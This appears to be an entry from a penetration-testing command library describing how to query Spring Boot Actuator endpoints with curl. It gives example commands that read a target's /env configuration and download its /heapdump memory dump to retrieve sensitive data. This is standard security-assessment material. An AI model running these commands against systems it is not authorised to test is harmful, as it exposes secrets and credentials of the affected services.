---
data: 'curl -v https://target-app.com/actuator/endpoint'
tags:
  - http
  - discovery
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 6aa11d71-b23b-474d-92ec-b60e2ae18c55
created_at: '2025-12-11T03:47:47.663Z'
updated_at: '2025-12-11T03:47:47.663Z'
verified: false
validated: true
submitted: true
---
# curl-access-actuator-endpoint

## Command

```bash
curl -v https://target-app.com/actuator/endpoint
```

## Description

Uses curl to access Spring Boot Actuator endpoints like /heapdump or /env, checking for public exposure and retrieving sensitive data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output for headers | No |
| `https://target-app.com/actuator/endpoint` | Target URL | Yes |

## Examples

### Basic Usage

```bash
curl -v https://target-app.com/actuator/env
```

### Advanced Usage

```bash
curl https://target-app.com/actuator/heapdump -o dump.hprof
```

## Expected Output

HTTP 200 response with JSON data for /env or binary heap dump for /heapdump.

## Related

- [[commands/curl-replay-auth-token]]
- [[procedures/Discover-Exposed-Spring-Boot-Actuator-Endpoints]]
